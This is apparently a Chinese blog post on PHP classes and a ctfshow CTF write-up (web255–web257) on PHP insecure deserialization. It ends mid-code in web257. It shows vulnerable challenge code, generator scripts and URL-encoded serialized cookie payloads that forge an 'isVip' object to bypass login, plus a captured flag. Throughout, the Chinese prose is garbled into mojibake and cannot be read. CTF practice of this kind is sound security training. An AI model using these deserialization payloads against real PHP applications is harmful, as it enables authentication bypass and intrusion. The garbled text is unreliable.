<h2 id="1ã€å®šä¹‰ç±»"><a href="#1ã€å®šä¹‰ç±»" class="headerlink" title="1ã€å®šä¹‰ç±»"></a>1ã€å®šä¹‰ç±»</h2><p>åœ¨ PHP ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ class å…³é”®å­—åŠ ç±»åçš„æ–¹å¼å®šä¹‰ä¸€ä¸ªç±»ï¼Œç„¶åç”¨å¤§æ‹¬å·<code>&#123; &#125;</code>å°†åœ¨ç±»ä½“ä¸­å®šä¹‰ç±»çš„å±æ€§å’Œæ–¹æ³•åŒ…è£¹èµ·æ¥ï¼Œç±»çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p>
<p>[ä¿®é¥°ç±»çš„å…³é”®å­—] class ç±»å{<br>   ç±»çš„å±æ€§å’Œæ–¹æ³•;<br> }</p>
<p>ç±»åå’Œå˜é‡åè¿˜æœ‰å‡½æ•°åçš„å‘½åè§„åˆ™ç›¸ä¼¼ï¼Œéƒ½éœ€è¦éµå¾ª PHP ä¸­çš„è‡ªå®šä¹‰å‘½åè§„åˆ™ï¼Œå¯ä»¥æ˜¯ä»»ä½•é PHP  ä¿ç•™å­—çš„åˆæ³•æ ‡ç­¾ã€‚ä¸€ä¸ªåˆæ³•ç±»åä»¥å­—æ¯æˆ–ä¸‹åˆ’çº¿å¼€å¤´ï¼Œåé¢è·Ÿç€è‹¥å¹²å­—æ¯ï¼Œæ•°å­—æˆ–ä¸‹åˆ’çº¿ã€‚å¦‚æœç±»åç”±å¤šä¸ªå•è¯ç»„æˆï¼Œä¹ æƒ¯ä¸Šå°†æ¯ä¸ªå•è¯çš„é¦–å­—æ¯å¤§å†™ã€‚å¦å¤–ï¼Œç±»åæœ€å¥½å…·æœ‰ä¸€å®šçš„æ„ä¹‰ï¼Œä¸è¦éšä¾¿ç”±å‡ ä¸ªå­—æ¯ç»„æˆã€‚</p>
<p> ä¿®é¥°ç±»çš„å…³é”®å­—æ˜¯ä¸€ä¸ªå¯é€‰å‚æ•°ï¼Œå¯ä»¥çœç•¥ã€‚æˆ‘ä»¬é€šå¸¸ä½¿ç”¨ä¸‹é¢è¿™äº›å…³é”®å­—æ¥ä¿®é¥°ç±»ï¼š</p>
<ul>
<li>abstractï¼šæŠ½è±¡ç±»æˆ–æ–¹æ³•ï¼Œè¢«ä¿®é¥°ä¸ºæŠ½è±¡ç±»ä¹‹åï¼Œç±»å°†ä¸èƒ½è¢«å®ä¾‹åŒ–ï¼Œä½†å¯ä»¥è¢«ç»§æ‰¿ã€‚å¦‚æœç±»ä¸­æœ‰è‡³å°‘ä¸€ä¸ªæ–¹æ³•è¢«å£°æ˜ä¸ºæŠ½è±¡çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªç±»ä¹Ÿå¿…é¡»å£°æ˜ä¸ºæŠ½è±¡çš„ã€‚ç»§æ‰¿ä¸€ä¸ªæŠ½è±¡ç±»çš„æ—¶å€™ï¼Œå­ç±»å¿…é¡»é‡æ–°å®šä¹‰çˆ¶ç±»ä¸­çš„æ‰€æœ‰æŠ½è±¡æ–¹æ³•ï¼Œè€Œä¸”è¿™äº›æ–¹æ³•çš„è®¿é—®æ§åˆ¶å¿…é¡»å’Œçˆ¶ç±»ä¸­ä¸€æ ·ã€‚</li>
<li>finalï¼šä½¿ç”¨ final ä¿®é¥°çš„ç±»ä¸èƒ½è¢«ç»§æ‰¿ï¼Œè€Œä½¿ç”¨ final ä¿®é¥°çš„æ–¹æ³•ä¸èƒ½åœ¨å­ç±»ä¸­é‡æ–°å®šä¹‰ã€‚</li>
</ul>
<p>æ³¨æ„ï¼šä¸€ä¸ªç±»å¯ä»¥åŒ…å«æœ‰å±äºè‡ªå·±çš„å¸¸é‡ã€å˜é‡ï¼ˆåœ¨ç±»ä¸­ç§°ä¸ºâ€œæˆå‘˜å±æ€§â€æˆ–è€…â€œå±æ€§â€ï¼‰ä»¥åŠå‡½æ•°ï¼ˆåœ¨ç±»ä¸­ç§°ä¸ºâ€œæˆå‘˜æ–¹æ³•â€æˆ–è€…â€œæ–¹æ³•â€ï¼‰ã€‚</p>
<h2 id="2ã€æˆå‘˜å±æ€§"><a href="#2ã€æˆå‘˜å±æ€§" class="headerlink" title="2ã€æˆå‘˜å±æ€§"></a>2ã€æˆå‘˜å±æ€§</h2><p>åœ¨ç±»ä¸­ç›´æ¥å£°æ˜çš„å˜é‡ç§°ä¸ºæˆå‘˜å±æ€§ï¼ˆä¹Ÿå¯ä»¥ç§°ä¸ºæˆå‘˜å˜é‡ï¼‰ï¼Œå¯ä»¥åœ¨ç±»ä¸­å£°æ˜å¤šä¸ªå˜é‡ï¼Œå³å¯¹è±¡ä¸­å¯ä»¥æœ‰å¤šä¸ªæˆå‘˜å±æ€§ï¼Œæ¯ä¸ªå˜é‡éƒ½å­˜å‚¨å¯¹è±¡ä¸åŒçš„å±æ€§ä¿¡æ¯ã€‚è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p>
<p>è®¿é—®æƒé™ä¿®é¥°ç¬¦ å±æ€§åç§° &#x3D; å±æ€§å€¼;</p>
<p>æˆå‘˜å±æ€§çš„ç±»å‹å¯ä»¥æ˜¯ PHP ä¸­çš„æ ‡é‡ç±»å‹å’Œå¤åˆç±»å‹ï¼Œæ‰€ä»¥ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ç±»å®ä¾‹åŒ–çš„å¯¹è±¡ï¼Œä½†åœ¨ç±»ä¸­ä½¿ç”¨èµ„æºå’Œç©ºç±»å‹æ˜¯æ²¡æœ‰æ„ä¹‰çš„ã€‚</p>
<p> å‰é¢æˆ‘ä»¬ç»è¿‡ï¼Œå£°æ˜å˜é‡æ—¶ä¸éœ€è¦ä»»ä½•å…³é”®å­—ä¿®é¥°ï¼Œä½†æ˜¯åœ¨ç±»ä¸­å£°æ˜æˆå‘˜å±æ€§æ—¶ï¼Œå˜é‡å‰é¢ä¸€å®šè¦ä½¿ç”¨ä¸€ä¸ªå…³é”®å­—æ¥ä¿®é¥°ï¼Œä¾‹å¦‚  publicã€privateï¼Œstatic  ç­‰ï¼Œä½†è¿™äº›å…³é”®å­—ä¿®é¥°çš„å˜é‡éƒ½å…·æœ‰ä¸€å®šçš„æ„ä¹‰ã€‚å¦‚æœä¸éœ€è¦æœ‰ç‰¹å®šæ„ä¹‰çš„ä¿®é¥°ï¼Œå¯ä»¥ä½¿ç”¨â€œvarâ€å…³é”®å­—ï¼Œä¸€æ—¦æˆå‘˜å±æ€§æœ‰å…¶ä»–çš„å…³é”®å­—ä¿®é¥°å°±éœ€è¦å»æ‰â€œvarâ€ã€‚</p>
<p> å¸¸ç”¨è®¿é—®æƒé™ä¿®é¥°ç¬¦åŠå…¶å«ä¹‰å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<ul>
<li>publicï¼šå…¬å…±çš„ï¼Œåœ¨ç±»çš„å†…éƒ¨ã€å­ç±»ä¸­æˆ–è€…ç±»çš„å¤–éƒ¨éƒ½å¯ä»¥ä½¿ç”¨ï¼Œä¸å—é™åˆ¶ï¼›</li>
<li>protectedï¼šå—ä¿æŠ¤çš„ï¼Œåœ¨ç±»çš„å†…éƒ¨å’Œå­ç±»ä¸­å¯ä»¥ä½¿ç”¨ï¼Œä½†ä¸èƒ½åœ¨ç±»çš„å¤–éƒ¨ä½¿ç”¨ï¼›</li>
<li>privateï¼šç§æœ‰çš„ï¼Œåªèƒ½åœ¨ç±»çš„å†…éƒ¨ä½¿ç”¨ï¼Œåœ¨ç±»çš„å¤–éƒ¨æˆ–å­ç±»ä¸­éƒ½æ— æ³•ä½¿ç”¨ã€‚</li>
</ul>
<p>æ³¨æ„ï¼šä¸€ä¸ªç±»ï¼Œå³ä¸€å¯¹å¤§æ‹¬å·ä¹‹é—´çš„å…¨éƒ¨å†…å®¹éƒ½è¦åœ¨ä¸€æ®µä»£ç ä¸­ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ª<code>&lt;?php ... ?&gt;</code>ä¹‹é—´ï¼Œä¸èƒ½åˆ†å‰²æˆå¤šå—ã€‚</p>
<p>ã€ç¤ºä¾‹ã€‘åˆ›å»ºä¸€ä¸ª Students ç±»å¹¶åœ¨ç±»ä¸­å£°æ˜ä¸€äº›æˆå‘˜å±æ€§ï¼Œä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class Students&#123;</span><br><span class="line">        var $name;</span><br><span class="line">        public $age;</span><br><span class="line">        private $sex;</span><br><span class="line">        public static $school;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>æç¤ºï¼šæƒé™ä¿®é¥°ç¬¦å¯ä»¥å’Œå®šä¹‰é™æ€å˜é‡çš„å…³é”®å­— static æ··åˆåœ¨ä¸€èµ·ä½¿ç”¨ï¼Œå¦‚ä¸Šé¢ä»£ç ä¸­æ‰€ç¤ºã€‚</p>
<h2 id="3ã€æˆå‘˜æ–¹æ³•"><a href="#3ã€æˆå‘˜æ–¹æ³•" class="headerlink" title="3ã€æˆå‘˜æ–¹æ³•"></a>3ã€æˆå‘˜æ–¹æ³•</h2><p>åœ¨ç±»ä¸­å®šä¹‰çš„å‡½æ•°è¢«ç§°ä¸ºæˆå‘˜æ–¹æ³•ã€‚å‡½æ•°å’Œæˆå‘˜æ–¹æ³•å”¯ä¸€çš„åŒºåˆ«å°±æ˜¯ï¼Œå‡½æ•°å®ç°çš„æ˜¯æŸä¸ªç‹¬ç«‹çš„åŠŸèƒ½ï¼Œè€Œæˆå‘˜æ–¹æ³•æ˜¯å®ç°ç±»ä¸­çš„ä¸€ä¸ªè¡Œä¸ºï¼Œæ˜¯ç±»çš„ä¸€éƒ¨åˆ†ã€‚</p>
<p> å¯ä»¥åœ¨ç±»ä¸­å£°æ˜å¤šä¸ªæˆå‘˜æ–¹æ³•ï¼Œæˆå‘˜æ–¹æ³•çš„å£°æ˜å’Œå‡½æ•°çš„å£°æ˜å®Œå…¨ä¸€æ ·ï¼Œåªä¸è¿‡åœ¨å£°æ˜æˆå‘˜æ–¹æ³•æ—¶å¯ä»¥åœ¨<code>function</code>å…³é”®å­—çš„å‰é¢åŠ ä¸€äº›è®¿é—®æƒé™ä¿®é¥°ç¬¦æ¥æ§åˆ¶è®¿é—®æƒé™ï¼Œä¾‹å¦‚ publicã€privateã€protected ç­‰ã€‚</p>
<p> å¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå£°æ˜çš„æˆå‘˜æ–¹æ³•å¿…é¡»å’Œç±»æ˜¯ç›¸å…³çš„ï¼Œä¸èƒ½æ˜¯ä¸€äº›æ²¡æœ‰æ„ä¹‰çš„æ“ä½œã€‚ä¾‹å¦‚ï¼Œåœ¨å£°æ˜å­¦ç”Ÿç±»æ—¶ï¼Œå¦‚æœå£°æ˜äº†â€œé£è¡Œâ€çš„æˆå‘˜æ–¹æ³•ï¼Œå®ä¾‹åŒ–å‡ºæ¥çš„æ¯ä¸ªå­¦ç”Ÿéƒ½å¯ä»¥é£äº†ï¼Œè¿™æ ·å°±æ˜¯ä¸€ä¸ªè®¾è®¡ä¸Šçš„é”™è¯¯ã€‚</p>
<p>ã€ç¤ºä¾‹ã€‘åœ¨ä¸Šé¢ç¤ºä¾‹ä¸­åˆ›å»ºçš„ Students ç±»ä¸­åˆ›å»ºä¸€äº›æˆå‘˜æ–¹æ³•ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    class Students&#123;</span><br><span class="line">        var $name;</span><br><span class="line">        public $age;</span><br><span class="line">        private $sex;</span><br><span class="line">        public static $school;</span><br><span class="line">        public function Write()&#123;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">        protected static function Read()&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        function Listen()&#123;</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><a href="http://c.biancheng.net/view/7492.html">http://c.biancheng.net/view/7492.html</a></p>
<h2 id="web255-â€“è®¤è¯†ååºåˆ—åŒ–"><a href="#web255-â€“è®¤è¯†ååºåˆ—åŒ–" class="headerlink" title="web255 â€“è®¤è¯†ååºåˆ—åŒ–"></a>web255 â€“è®¤è¯†ååºåˆ—åŒ–</h2><p>è§¦å‘æ—¶æœºï¼Œåˆ†ç»„è®°å¿†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__construct  //å®ä¾‹åŒ–å¯¹è±¡æ—¶è§¦å‘</span><br><span class="line">__destruct  //å¯¹è±¡å¼•ç”¨å®Œæˆæˆ–å¯¹è±¡è¢«é”€æ¯ååºåˆ—åŒ–ä¹‹å</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__sleep()  //serialize()ä¹‹å‰</span><br><span class="line">__wakeup()  //unserialize()ä¹‹å‰</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__tostring() //æŠŠå¯¹è±¡å½“ä½œå­—ç¬¦ä¸²æ‰ç”¨ï¼ˆä½¿ç”¨echo printï¼‰</span><br><span class="line">__invoke()  //æŠŠå¯¹è±¡å½“æˆå‡½æ•°è°ƒç”¨</span><br><span class="line">__clone()  //å½“ä½¿ç”¨clone æ‹·è´å®Œæˆä¸€ä¸ªå¯¹è±¡</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__call() //è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•</span><br><span class="line">__callStatic() //é™æ€è°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„æ–¹æ³•</span><br><span class="line">__get()  /è°ƒç”¨çš„æˆå‘˜å±æ€§ä¸å­˜åœ¨</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__set() //ç»™ä¸å­˜åœ¨çš„æˆå‘˜å±æ€§èµ‹å€¼</span><br><span class="line">__isset()  //å¯¹ä¸å¯è®¿é—®å±æ€§ä½¿ç”¨isset()æˆ–empty</span><br><span class="line">__unset()   //å¯¹ä¸å¯è®¿é—®å±æ€§ä½¿ç”¨unset()</span><br></pre></td></tr></table></figure>

<h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p>PHP serialize() å‡½æ•°</p>
<p><strong>serialize()</strong> å‡½æ•°ç”¨äºåºåˆ—åŒ–å¯¹è±¡æˆ–æ•°ç»„ï¼Œå¹¶è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p>
<p><strong>serialize()</strong> å‡½æ•°åºåˆ—åŒ–å¯¹è±¡åï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„å°†å®ƒä¼ é€’ç»™å…¶ä»–éœ€è¦å®ƒçš„åœ°æ–¹ï¼Œä¸”å…¶ç±»å‹å’Œç»“æ„ä¸ä¼šæ”¹å˜ã€‚</p>
<p>å¦‚æœæƒ³è¦å°†å·²åºåˆ—åŒ–çš„å­—ç¬¦ä¸²å˜å› PHP çš„å€¼ï¼Œå¯ä½¿ç”¨ <a href="https://www.runoob.com/php/php-unserialize-function.html">unserialize()</a>ã€‚</p>
<p><strong>è™½ç„¶æˆ‘ä»¬ä¸èƒ½æ”¹å˜ç±»æ–¹æ³•ï¼Œä½†æˆ‘ä»¬å¯ä»¥æ”¹å˜ç±»çš„å±æ€§</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¼€å§‹æœ‰ååºåˆ—åŒ–ï¼Œä¸»è¦å°±æ˜¯$isVipçš„å€¼éœ€è¦ä¸ºtrue</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åºåˆ—åŒ–ä¸€ä¸ªctfShowUserçš„å®ä¾‹ï¼Œå°†å…¶ä¸­çš„$isVipæ›´æ”¹ä¸ºtrue</p>
<p>é€šè¿‡cookieä¼ é€’åºåˆ—åŒ–å­—ç¬¦ä¸²å°±å¯ä»¥äº†,<strong>è®°å¾—åºåˆ—åŒ–å­—ç¬¦ä¸²è¦è¿›è¡Œurlç¼–ç </strong></p>
<p>ç”Ÿæˆåºåˆ—åŒ–å­—ç¬¦ä¸²</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">	<span class="comment">// ä¼ å…¥çš„å¯¹è±¡isvip=true;</span></span><br><span class="line">	<span class="comment">// O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span></span><br></pre></td></tr></table></figure>

<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET username=xxxxxx&amp;password=xxxxxx</span><br><span class="line">COOKIE user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure>

<h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>å¤šäº†ä¸€ä¸ª</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;ctf&#x27;</span>;</span><br><span class="line">		<span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxx&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>é‡æ–°å®šä¹‰ä¸€ä¸‹username password</p>
<p>payload: username&#x3D;ctf&amp;password&#x3D;xxx</p>
<p><code>url=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A8%3A%22username%22%3Bs%3A3%3A%22ctf%22%3Bs%3A8%3A%22password%22%3Bs%3A3%3A%22xxx%22%3B%7D</code></p>
<p>ctfshow{02a42717-ddee-45d2-964d-fde32fa618bf}</p>
<h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123; <span class="comment">//é­”æœ¯æ–¹æ³• é€šå¸¸æ„é€ æ–¹æ³•è¢«ç”¨æ¥æ‰§è¡Œä¸€äº›æœ‰ç”¨çš„åˆå§‹åŒ–ä»»åŠ¡ï¼Œå¦‚å¯¹æˆå‘˜å±æ€§åœ¨åˆ›å»ºå¯¹è±¡æ—¶èµ‹äºˆåˆå§‹å€¼ã€‚åœ¨ç±»å®ä¾‹åŒ–çš„æ—¶å€™,ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥é­”æœ¯æ–¹æ³•,è¿›è¡Œç±»çš„åˆå§‹åŒ–;</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span 